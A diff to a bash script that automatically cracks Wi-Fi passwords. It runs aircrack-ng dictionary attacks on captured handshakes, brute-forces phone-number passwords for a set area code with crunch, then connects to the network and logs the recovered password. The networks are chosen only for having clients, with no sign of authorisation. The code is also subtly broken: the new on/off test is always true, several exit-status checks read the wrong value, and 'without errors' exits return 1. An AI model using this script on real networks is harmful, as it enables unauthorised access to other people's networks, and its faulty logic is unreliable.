@@ -2,6 +2,8 @@
 
 #Initial variables set
 onlywithclients=1         #Search only for BSSIDS with clients (This can be touchy since it will only detect if there are clients during the initial one minute scan)
+crackwithphone=1          #Attempt to crack the password with phone numbers (popular with mobile hotspots) Set the area code below if you have this on
+areacode=208              #Change this to the state area code if you have "crackwithphone" enabled
 
 
 if [[ $(grep ERROR caplog.txt) == '' ]]; then          #If the last exit was without error, clear/create the caplog
@@ -269,7 +271,7 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
     for wordlists in /root/Documents/dictionaries/*; do
       echo $(date) " - Trying to crack the file with $wordlists" >> caplog.txt
       aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w $wordlists    #Tries to crack it with the dictionary
-      # aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
+      #aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
       if [[ $(cat crackedpassword) != '' ]]; then
         echo $(date) " - It seems something was added to the crackedpassword file, not going through any more dictionaries" >> caplog.txt
         break
@@ -295,16 +297,42 @@ if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
         exit 1                #Since it has a connection, no need to break any passwords, exits the script
       fi
     fi
-    areacode=208            #Change this to the state area code
-    crunch 10 10 -t $areacode%%%%%%% | aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w -      #Tries to crack it with a phone number
-    if [[ $(cat crackedpassword) == '' ]]; then
-      echo $(date) " - NO PASSWORD FOUND! --- Quitting ---" >> caplog.txt
-      echo $(date) " - Turning off monitoring mode" >> caplog.txt
-      ifconfig wlan1 down
-      iwconfig wlan1 mode managed
-      ifconfig wlan1 up
-      echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
-      exit 1
+    if [[ crackwithphone=1 ]]; then
+      echo $(date) " - Trying phone numbers now, area code $areacode" >> caplog.txt
+      crunch 10 10 -t $areacode%%%%%%% | aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w -      #Tries to crack it with a phone number
+      if [[ $(cat crackedpassword) == '' ]]; then
+        echo $(date) " - NO PASSWORD FOUND! --- Quitting ---" >> caplog.txt
+        echo $(date) " - Turning off monitoring mode" >> caplog.txt
+        ifconfig wlan1 down
+        iwconfig wlan1 mode managed
+        ifconfig wlan1 up
+        echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
+        exit 1
+      fi
+      if [[ $(cat crackedpassword) != '' ]]; then
+        echo $(date) " - The password was cracked." >> caplog.txt
+        echo $(date) " - Password: $(cat crackedpassword)" >> caplog.txt
+        nmcli d wifi connect "$(echo $ssid)" password $(cat crackedpassword)
+        sleep 60
+        ping -c 5 www.google.com          #Tests connection, requiring DNS
+        if [[ $(echo $?) == 2 ]]; then
+          echo $(date) " - Failed connection to Google.com" >> caplog.txt
+          ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
+          if [[ $(echo $?) == 2 ]]; then
+            echo $(date) " - Failed connection to 8.8.8.8! No network connection, something went wrong." >> caplog.txt
+            echo $(date) " - EXIT" >> caplog.txt           #Exit without errors, since it was just a connection error, caplog needs overwritten next time
+            exit 1
+          fi
+        fi
+        if [[ $(echo $?) == 0 ]]; then
+          echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
+          python sendsuccess.py
+          echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
+          exit 1                #Since it has a connection, no need to break any passwords, exits the script
+        fi
+      fi
+    else
+      echo $(date) " - Not cracking with phone number" >> caplog.txt
     fi
 fi
 if [[ $(grep wlan1 /proc/net/dev) == '' ]]; then
